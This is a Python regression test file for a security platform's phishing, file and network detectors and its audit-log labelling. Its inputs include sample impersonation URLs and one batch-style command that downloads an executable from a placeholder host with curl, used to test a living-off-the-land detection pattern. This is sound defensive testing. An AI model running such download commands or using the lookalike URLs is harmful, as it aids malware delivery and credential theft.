"""Regression tests for detector defects found by evaluation, and a floor under measured quality.

The URL, message, file and network numbers in docs/detection-evaluation.md come from backend/ml/evaluate.py; the floors
below are a little under those numbers so that a change that makes a detector clearly worse fails the build.
"""
import io
import zipfile

import pytest

from app.services import url_features as uf
from app.services.file_analyzer import file_analyzer, load_hash_feed
from app.services.network_engine import network_detector, synthetic_flows
from app.services.phishing_engine import ALERT_SCORE, SUSPICIOUS_SCORE, phishing_detector
from app.schemas import NetworkRecordInput
from ml.evaluate_files import constructed
from ml.message_corpora import BLIND, EVAL

API = "/api/v1"


def url_score(url):
    return phishing_detector.analyze_url(url).risk_score


# ----------------------------------------------------------------------------------------------- URLs

@pytest.mark.parametrize("url", ["http://localhost:8080/admin", "http://192.168.1.1/router-login", "http://10.0.0.5/login",
                                 "http://intranet/hr/portal", "http://169.254.169.254/latest/meta-data/", "https://wiki.corp/login"])
def test_internal_addresses_are_not_phishing(url):
    # They used to be reported as Critical 95; an internal address is not evidence of anything.
    assert url_score(url) < SUSPICIOUS_SCORE


@pytest.mark.parametrize("url", ["https://accounts.google.com/signin", "https://www.paypal.com/signin", "https://login.microsoftonline.com/common/oauth2",
                                 "https://github.com/login", "https://firstbank.com/", "https://www.amazon.co.uk/ap/signin", "https://support.apple.com/account"])
def test_real_sign_in_pages_are_not_flagged(url):
    assert url_score(url) < SUSPICIOUS_SCORE


@pytest.mark.parametrize("url", ["http://login-microsoft365-verify.xyz/auth?session=123", "https://paypa1-secure.com/login",
                                 "https://microsoft-login.pages.dev/", "http://secure-chase-banking.top/verify", "http://203.0.113.9/paypal/login.php",
                                 "https://docusign-secure.pages.dev/view?id=1", "http://netflix-billing-support.xyz/update"])
def test_impersonation_urls_are_flagged(url):
    assert url_score(url) >= ALERT_SCORE


def test_brand_match_needs_a_whole_word_for_short_brands():
    parsed = uf.ParsedUrl("https://firstbank.com/")
    assert uf.brand_impersonated(parsed) is None            # "irs" inside "first" is not the tax authority
    assert uf.brand_impersonated(uf.ParsedUrl("https://irs-refund.com/")) == "irs"
    assert uf.brand_impersonated(uf.ParsedUrl("https://www.irs.gov/")) is None


def test_free_hosting_does_not_inherit_the_trust_of_its_parent():
    parsed = uf.ParsedUrl("https://paypal-verify.vercel.app/")
    assert parsed.registrable == "paypal-verify.vercel.app"
    assert parsed.on_user_content_host
    assert uf.brand_impersonated(parsed) == "paypal"


def test_registrable_domain_handles_country_suffixes():
    assert uf.registrable_domain("www.bbc.co.uk") == "bbc.co.uk"
    assert uf.registrable_domain("a.b.example.com") == "example.com"
    assert uf.registrable_domain("x.pages.dev") == "x.pages.dev"


def test_lookalike_of_a_popular_domain():
    assert uf.lookalike_of(uf.ParsedUrl("https://gooogle.com/")) == "google.com"
    assert uf.lookalike_of(uf.ParsedUrl("https://google.com/")) is None


def test_url_model_ships_and_loads_without_pickle():
    model = uf.load_url_model()
    assert model is not None and len(model.weights) > 1000
    assert 0.0 <= model.probability(uf.ParsedUrl("https://example.org/")) <= 1.0


def test_url_is_never_fetched_or_resolved(monkeypatch):
    import socket
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: (_ for _ in ()).throw(AssertionError("DNS lookup attempted")))
    phishing_detector.analyze_url("http://some-unregistered-name-12345.example/login")


# ------------------------------------------------------------------------------------------- messages

def _flag(text, threshold=SUSPICIOUS_SCORE):
    return phishing_detector.analyze_message(text, "email").risk_score >= threshold


def test_message_recall_and_false_positives_stay_within_floor():
    pos = [t for t, y in EVAL if y]
    neg = [t for t, y in EVAL if not y]
    assert sum(_flag(t) for t in pos) / len(pos) >= 0.80
    assert sum(_flag(t, ALERT_SCORE) for t in pos) / len(pos) >= 0.60
    assert sum(_flag(t, ALERT_SCORE) for t in neg) == 0
    assert sum(_flag(t) for t in neg) <= 1


def test_blind_message_set():
    wrong = [t[:50] for t, y in BLIND if _flag(t) != bool(y)]
    assert len(wrong) <= 1, wrong


@pytest.mark.parametrize("text", ["IT will never ask for your password by email. Please use the self-service page.",
                                  "Urgent: the staging database is down; engineering will post an update within the hour.",
                                  "See https://www.dropbox.com/account for your receipt."])
def test_ordinary_messages_with_alarming_words_are_not_alerts(text):
    assert not _flag(text, ALERT_SCORE)


def test_a_malicious_link_alone_makes_a_message_suspicious():
    assert _flag("Please look at this: http://paypa1-secure.com/login", ALERT_SCORE)


# ------------------------------------------------------------------------------------------- files

def test_constructed_file_samples():
    rows = [(n, file_analyzer.analyze_file_bytes(f, c).risk_score, y) for n, f, c, y in constructed()]
    assert [n for n, s, y in rows if not y and s >= SUSPICIOUS_SCORE] == []
    assert [n for n, s, y in rows if y and s < SUSPICIOUS_SCORE] == []


def test_empty_file_is_not_malicious():
    # The empty-file hash used to force a score of 90.
    r = file_analyzer.analyze_file_bytes("empty.txt", b"")
    assert r.risk_score < SUSPICIOUS_SCORE and not r.reputation_lookup["match_found"]


def test_words_like_bitcoin_do_not_make_a_text_file_ransomware():
    assert file_analyzer.analyze_file_bytes("notes.txt", b"Board paper on bitcoin treasury policy and ransom insurance.").risk_score < SUSPICIOUS_SCORE


def test_compressed_formats_are_not_penalised_for_entropy():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("a.bin", bytes(range(256)) * 400)
    r = file_analyzer.analyze_file_bytes("bundle.zip", buf.getvalue())
    assert r.risk_score < SUSPICIOUS_SCORE


def test_lotl_pattern_requires_a_download_tool_after_cmd():
    assert any("Living" in p for p in file_analyzer.analyze_file_bytes("a.bat", b"cmd /c curl http://x.test/a.exe -o a.exe").suspicious_patterns)
    assert not any("Living" in p for p in file_analyzer.analyze_file_bytes("a.txt", b"We use wget at home and certutil at work.").suspicious_patterns)


def test_injection_apis_alone_are_not_enough():
    assert not any("injection" in p.lower() for p in file_analyzer.analyze_file_bytes("lib.dll", b"VirtualAlloc is used to allocate memory").suspicious_patterns)


def test_organisation_hash_feed_is_loaded(tmp_path, monkeypatch):
    import hashlib
    from app.config import settings
    payload = b"definitely-not-a-real-sample"
    feed = tmp_path / "feed.txt"
    feed.write_text(f"# export\n{hashlib.sha256(payload).hexdigest()},Test.Family\nnot-a-hash\n")
    assert len(load_hash_feed(str(feed))) == 1
    monkeypatch.setattr(settings, "FILE_HASH_FEED_PATH", str(feed))
    r = file_analyzer.analyze_file_bytes("sample.bin", payload)
    assert r.reputation_lookup["match_found"] and r.reputation_lookup["threat_name"] == "Test.Family" and r.risk_score >= 80


# ------------------------------------------------------------------------------------------- network

def _benign(n, seed):
    return [NetworkRecordInput(source_ip=f"10.0.0.{i % 200 + 2}", destination_ip=f"52.1.{i % 250}.7", destination_port=p, bytes_transferred=b, packet_count=k)
            for i, (p, b, k) in enumerate(synthetic_flows(n, seed))]


def test_ordinary_traffic_rarely_alerts():
    r = network_detector.analyze_batch(_benign(4000, seed=77), include_ml=True)
    assert r.anomalies_detected / 4000 < 0.01
    assert network_detector.analyze_batch(_benign(4000, seed=78), include_ml=False).anomalies_detected == 0


def test_browsing_many_services_is_not_a_port_scan():
    recs = [NetworkRecordInput(source_ip="10.0.1.5", destination_ip=f"52.1.1.{i}", destination_port=p) for i, p in enumerate((80, 443, 53, 22, 993, 587, 8080, 25, 110, 143, 5432))]
    assert network_detector.analyze_batch(recs, include_ml=False).anomalies_detected == 0


def test_large_internal_transfer_is_not_exfiltration():
    rec = NetworkRecordInput(source_ip="10.0.0.5", destination_ip="10.0.0.9", destination_port=445, bytes_transferred=900_000_000, packet_count=600000)
    assert not any("Exfil" in a.event_type for a in network_detector.analyze_batch([rec], include_ml=False).alerts)


def test_large_external_upload_is_flagged():
    rec = NetworkRecordInput(source_ip="10.0.0.5", destination_ip="185.220.101.47", destination_port=443, bytes_transferred=120_000_000, packet_count=90000)
    assert any("Exfil" in a.event_type for a in network_detector.analyze_batch([rec], include_ml=False).alerts)


def test_telnet_is_risky_but_not_labelled_command_and_control():
    rec = NetworkRecordInput(source_ip="10.0.0.5", destination_ip="10.0.0.9", destination_port=23)
    alert = network_detector.analyze_batch([rec], include_ml=False).alerts[0]
    assert alert.event_type == "Risky Service Port" and alert.severity == "High"


# ------------------------------------------------------------------------- audit fixes: real actors, honest labels

def test_analysis_audit_entries_name_the_signed_in_user(analyst, db):
    from app.models import AuditLog
    analyst.post(f"{API}/phishing/analyze", json={"submission_type": "email", "content": "hello"})
    analyst.post(f"{API}/files/analyze", files={"file": ("a.txt", b"hi")})
    analyst.post(f"{API}/network/analyze-batch", json=[{"source_ip": "1.2.3.4", "destination_ip": "10.0.0.1", "destination_port": 22}])
    db.expire_all()
    for action in ("PHISHING_ANALYSIS_RUN", "FILE_ANALYZED", "NETWORK_BATCH_ANALYZED"):
        row = db.query(AuditLog).filter(AuditLog.action == action).order_by(AuditLog.id.desc()).first()
        assert row.actor == "analyst@cybershield.corp", (action, row.actor)


def test_sample_submissions_create_simulated_events_and_real_ones_do_not(analyst, db):
    from app.models import SecurityEvent
    url = "http://login-microsoft365-verify.xyz/auth"
    analyst.post(f"{API}/phishing/analyze", json={"submission_type": "url", "content": url, "is_sample": True})
    sample = db.query(SecurityEvent).filter(SecurityEvent.event_source.like("User Submission%")).order_by(SecurityEvent.id.desc()).first()
    assert sample.is_simulated is True
    analyst.post(f"{API}/phishing/analyze", json={"submission_type": "url", "content": url})
    db.expire_all()
    real = db.query(SecurityEvent).filter(SecurityEvent.event_source.like("User Submission%")).order_by(SecurityEvent.id.desc()).first()
    assert real.is_simulated is False


def test_gateway_block_reason_comes_from_the_analysis_not_a_canned_sentence(analyst):
    r = analyst.post(f"{API}/url/inspect", json={"url": "http://login-microsoft365-verify.xyz/auth", "employee_email": "e@x.co"}).json()
    assert "Brand Squatting" in r["blocking_reason"] and "nothing was actually blocked" in r["blocking_reason"]
    assert "Disposable TLD and credential spoofing" not in r["blocking_reason"]


def test_dashboard_reputation_status_reflects_real_provider_state(analyst):
    s = analyst.get(f"{API}/dashboard/metrics").json()["reputation_service_status"]
    assert "VirusTotal" in s and "no external reputation lookups are made" not in s


def test_platform_status_is_measured_not_asserted(analyst, db):
    from app.services import settings_store
    from app.models import SecuritySetting
    db.query(SecuritySetting).filter(SecuritySetting.key == "worker_heartbeat").delete()
    db.commit()
    assert analyst.get(f"{API}/dashboard/metrics").json()["system_status"].startswith("Degraded")
    from app.worker import deliver_once
    deliver_once()
    assert analyst.get(f"{API}/dashboard/metrics").json()["system_status"] == "Operational"
